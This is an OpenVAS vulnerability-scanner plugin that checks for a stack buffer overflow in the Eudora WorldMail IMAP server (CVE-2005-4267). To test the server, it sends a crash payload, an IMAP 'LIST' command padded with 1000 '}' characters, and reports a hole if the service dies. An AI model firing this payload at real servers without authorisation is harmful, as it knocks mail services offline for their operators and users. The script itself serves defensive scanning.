###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eudora_worldmail_imap_server_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Eudora WorldMail IMAP Server Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  within the context of the application or cause a denial of service condition.
  Impact Level: System/Application";
tag_affected = "Eudora WorldMail Server 3.0";
tag_insight = "The flaw is due to a boundary error when processing user supplied
  IMAP commands. This can be exploited to cause a stack-based overflow via
  a long string containing a '}' character.";
tag_solution = "No solution or patch is available as of 18th January, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.eudora.com/worldmail/";
tag_summary = "This host is running WorldMail IMAP Server and prone to buffer
  overflow vulnerability.";

if(description)
{
  script_id(802294);
  script_version("$Revision: 12 $");
  script_bugtraq_id(15980);
  script_cve_id("CVE-2005-4267");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-01-18 14:14:14 +0530 (Wed, 18 Jan 2012)");
  script_name("Eudora WorldMail IMAP Server Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/22097");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/17640");
  script_xref(name : "URL" , value : "http://securitytracker.com/id/1015391");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18354");
  script_xref(name : "URL" , value : "http://www.idefense.com/intelligence/vulnerabilities/display.php?id=359");

  script_description(desc);
  script_summary("Check if WorldMail IMAP Server is vulnerable to buffer overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/imap", 143);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Get IMAP Port
port = get_kb_item("Services/imap");
if(!port) {
  port = 143;
}

## Check Port State
if(! get_port_state(port)){
  exit(0);
}

## Open TCP Socket
if(!soc = open_sock_tcp(port)){
  exit(0);
}

## Check Banner And Confirm Application
res = recv(socket:soc, length:512);
if("WorldMail IMAP4 Server" >!< res)
{
  close(soc);
  exit(0);
}

## Build Exploit
exploit = string("LIST ",crap(data:"}", length:1000),"\r\n");

## Send Exploit
send = send(socket:soc, data:exploit);
close(soc);

## Waiting
sleep(3);

## Try to Open Socket
if(!soc1 =  open_sock_tcp(port))
{
  security_hole(port);
  exit(0);
}

## Confirm Server is still alive and responding
if(! res = recv(socket:soc1, length:512)) {
  security_hole(port);
}
close(soc1);
